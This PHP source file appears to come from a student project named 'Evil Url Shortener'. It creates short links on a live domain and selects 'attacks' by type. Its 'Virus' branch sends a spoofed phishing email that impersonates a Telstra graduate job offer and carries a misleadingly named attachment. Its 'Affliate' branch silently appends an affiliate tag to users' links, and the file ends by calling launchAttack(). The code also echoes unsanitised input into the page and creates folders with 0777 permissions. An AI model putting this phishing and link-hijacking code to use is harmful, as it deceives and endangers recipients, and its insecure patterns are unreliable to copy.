<?php
session_start();
require_once "../php/DataBaseHandling.php";
require_once "../php/SelectedController.php";

$key = "";
$conn = openConnection();

$longlink = $_POST['urllink'];
$typeOfAttack = $_POST['Type'];
$address = $_POST["email"];
$useraddress = $_POST["useremail"];
$_SESSION['urllink']=$longlink;
$_SESSION['Type']=$typeOfAttack;

//creating file and folder in server 
function createFolderAndFile($key){
  if (!is_dir($key)) {
    $full = getcwd();
    $path = substr($full , 0 , strlen($full) - strlen(strrchr($full , "/")));
    mkdir($path."/"."$key" , 0777 , true);
 //   $myfile = fopen("../$key/index.html", "w") or die("Unable to open file!");
//    $myfileToRead = fopen("../php/SelectedController.php", "r") or die("Unable to open file!");
//    $txt = fread($myfileToRead,filesize("../php/SelectedController.php"));
//    fclose($myfileToRead);
//    fwrite($myfile, $txt);
//    fclose($myfile);
  }
}

//if($typeOfAttack === 'Cryptography'){
//  $illlonglink = $_POST['illurlink'];
//  $_SESSION['illlonglink'] = $illlonglink;
//  $key = generateKey(6,$key);
//  $key = checkForDuplicateKeys($key , $conn);
//  addDataToDatabase($key , $longlink , $conn);
//  addDataToDatabase($key , $illlonglink , $conn);
//  $config = array(
//    "digest_alg" => "sha512",
//    "private_key_bits" => 4096,
//    "private_key_type" => OPENSSL_KEYTYPE_RSA,
//);
//    $res = openssl_pkey_new($config);
//  // Get private key
//  openssl_pkey_export($res, $privkey);
//
//  // Get public key
//  $pubkey = openssl_pkey_get_details($res);
//  $pubkey=$pubkey["key"];
//    
//$subject = 'TOP SECRET';
//
//$message = "hello, this is your public key: " .$pubkey;
//$privatemessage = "hello, this is your private key: " .$privkey;
//
//// More headers
//$headers .= 'From: <stme@example.com>' . "\r\n";
//mail($address,$subject,$message,$headers);
//    echo $useraddress;
//    
//$userlink = "http://stme.esy.es/".$key."/get.php";
//
//openssl_private_encrypt($userlink, $encrypted, $privkey);
//$userlink = $encrypted;    
//
//  createFolderAndFile($key);
//mail($useraddress,$subject,$privatemessage,$headers);  
//
//}

$key = generateKey(6,$key);
$key = checkForDuplicateKeys($key , $conn);
createFolderAndFile($key);
$userlink = "http://stme.esy.es/".$key;

//Selecting which data to store according to different attacks
if($typeOfAttack == "Password" || $typeOfAttack == "Dos"){
   $illlonglink = $_POST['illurlink'];
  $_SESSION['illlonglink'] = $illlonglink;
  addDataToDatabase($key , $longlink , $conn);
  addDataToDatabase($key , $illlonglink , $conn);
 }
else if($typeOfAttack == "Affliate"){
     $textToInsert = "&tag=socialexperim-20";
     $newLongLink = $longlink.$textToInsert; 
     $key = checkForDuplicateLinks($longlink,$conn);
     if(is_null($key)===TRUE){
        addDataToDatabase($key , $newLongLink , $conn);
     }
}
else if($typeOfAttack == "Virus"){
    addDataToDatabase($key , $longlink , $conn);
  // More headers
    $fileatt = "../imgs/telstralogo.png"; // Path to the file
    $fileatt_type = "image/png"; // File Type
    $fileatt_name = "TelstraGraduateLetterOfOffer.png"; // Filename that will be used for the file as the attachment
    $message .= '<html><body>';
    $message .= '<img src="http://stme.esy.es/imgs/telstralogo.png">';
    $message .= '<p><br/>Dear Applicant</b></p>'; 
    $message .= '<p><br/>We are very pleased to offer you the position of Graduate, on a full time basis, commencing August 31st 2016 as part of Telstra Graduate Program.</b></p>'; 
    $message .= '<p><br/>Please accept my congratulations on your success at being selected for this job. I would also like to thank you for considering Telstra as a company for which you would like to work.  The success of an organisation depends very much on its most important asset - its people - and I am sure that should you accept the offer you will enjoy contributing to and being a part of Telstra success.  </b></p>'; 
    $message .= '<p><br/> Your total remuneration (salary inclusive of CPF) is: $50,000 AUD</b></p>';
    $message .= '<p><br/>Please go through the contract which is attached to this email.</b></p>'; 
    $message .= '<p><br/> Please call or email Jared 07524235103 if you have any questions and also to confirm that you are accepting Telstra offer by 5pm Tuesday the 7th of June. Subject to this acceptance by you, a written agreement will be sent, which will provide further details of your terms and conditions of employment. </b></p>'; 
    $message .= '<p><br/>Once again, congratulations on your selection and I welcome you to the Telstra Graduate Program.</b></p>'; 
    $message .= '<p><br/>Kind regards,</b></p>'; 
    $message .= '<p><br/>Jared Koh</b></p>'; 
    $message .= '<p><br/>Graduate Program Manager</b></p>'; 
    $message .= '<p><br/>Telstra HR</b></p>'; 
    $message .= '</body></html>';
    $subject = 'Graduate Letter of Offer';
    
    $headers = "From: ". "TelstraCareers@no-reply.com";
    $file = fopen($fileatt,'rb');
    $data = fread($file,filesize($fileatt));
    fclose($file);

    $semi_rand = md5(time());
    $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
    $headers .= "\nMIME-Version: 1.0\n" .
    "Content-Type: multipart/mixed;\n" .
    " boundary=\"{$mime_boundary}\"";

    $message .= "This is a multi-part message in MIME format.\n\n" .
    "--{$mime_boundary}\n" .
    "Content-Type:text/html; charset=\"iso-8859-1\"\n" .
    "Content-Transfer-Encoding: 7bit\n\n" .
    $message .= "\n\n";

    $data = chunk_split(base64_encode($data));

    $message .= "--{$mime_boundary}\n" .
    "Content-Type: {$fileatt_type};\n" .
    " name=\"{$fileatt_name}\"\n" .
    "Content-Transfer-Encoding: base64\n\n" .
    $data .= "\n\n" ."--{$mime_boundary}--\n";
    mail($address,$subject,$message,$headers);    
}
else{
    addDataToDatabase($key , $longlink , $conn); 
  }


?>


<!DOCTYPE HTML>
<html lang="en">
    <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>FinalYearProject</title>
      <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
      <link rel="stylesheet" type="text/css" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
      <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.6.2/css/bootstrap-select.min.css" />
      <script src="//cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.6.2/js/bootstrap-select.min.js"></script>
      <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
      <link href="../css/main.css" rel="stylesheet">
      <script src = "../js/ui.js" type="text/javascript"></script>
    </head>
    <body>
        <!--setting up navigation bar-->
        <nav class="navbar navbar-default navbar-fixed-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                        <span class="sr-only">Toggle Navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="#">Evil Url Shortener</a>
                </div>
                <div id="navbar" class="navbar-collapse collapse" aria-expanded="false"style="height: 1px;">
                    <ul class="nav navbar-nav">
                        <li class="active">
                            <a href="http://stme.esy.es">Home</a>
                        </li>
                        <li>
                            <a href="http://stme.esy.es/map.html">Map</a>
                        </li>
                        <li>
                            <a href="http://stme.esy.es/analytics.html">Analytics</a>
                        </li>
                        <li>
                            <a href="http://stme.esy.es/news.html">News</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <!--setting up form-->
        <div class = "urlform" >
            <h1> Thanks For Using :) </h1>
            <button type="button" class="btn btn-success" style="float:right" id="go" onclick="">Go</button>
            <div style="overflow: hidden; padding-right: .5em;">
                <input type="url" class="form-control" name="urllink" id="form" value="<?php echo $userlink ?>"/>
            </div>
        </div>
      <!--setting up video background-->
      <div class ="videobackground">
        <video autoplay loop width="100%" class="bgvid">
          <source src="../Productive-Morning/MP4/Productive-Morning.mp4" type="video/mp4" />Your browser does not support the video tag. I suggest you upgrade your browser.
          <source src="../Productive-Morning/WEBM/Productive-Morning.webm" type="video/webm" />Your browser does not support the video tag. I suggest you upgrade your browser.
        </video>
        <div class="poster hidden">
          <img src="../Productive-Morning/snapshots/Productive-Morning.jpg" alt="">
        </div>
      </div>

    </body>
</html>
<?php 
launchAttack($typeOfAttack,$conn,$key);
$conn->close(); 
?> 